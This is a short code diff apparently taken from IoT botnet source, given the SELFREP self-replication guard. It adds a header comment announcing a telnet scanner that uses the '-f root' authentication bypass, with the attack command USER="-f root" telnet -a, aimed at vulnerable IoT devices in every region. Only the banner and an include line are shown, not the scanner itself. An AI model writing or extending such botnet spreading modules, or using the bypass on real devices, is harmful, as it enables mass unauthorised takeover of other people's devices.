@@ -1,5 +1,14 @@
 #ifdef SELFREP
 
+/* ============================================================================
+ * TELNET BYPASS SCANNER - Authentication Bypass (Port 23)
+ * ============================================================================
+ * Exploit: Telnet authentication bypass via -f root flag
+ * Targets: IoT devices with telnet auth bypass vulnerability
+ * Method: USER="-f root" telnet -a command
+ * Global: All regions with vulnerable IoT devices
+ * ============================================================================ */
+
 #pragma once
 
 #include <stdint.h>
